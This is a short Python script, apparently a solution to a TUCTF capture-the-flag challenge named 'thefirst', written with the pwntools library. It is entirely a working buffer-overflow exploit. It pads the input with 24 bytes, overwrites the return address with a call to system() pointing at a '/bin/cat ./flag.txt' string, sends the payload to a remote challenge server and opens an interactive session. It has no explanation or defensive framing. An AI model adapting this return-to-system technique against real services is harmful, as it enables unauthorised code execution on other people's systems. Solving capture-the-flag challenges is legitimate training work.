#!/usr/bin/python3

from pwn import *

context.log_level = 'debug'

def generate_payload():
    payload = b""
    payload += b"A"*24
    payload += p32(0x080491fa) # eip system()
    payload += b"DUMM"
    payload += p32(0x08048000 + 0x2008) # /bin/cat ./flag.txt
    return payload

def main():
    #target = process("./thefirst")
    target = remote("chal.tuctf.com", 30508)
    prompt = target.recvuntil(b"> ")

    payload = generate_payload()
    target.send(payload)

    target.interactive()

main()
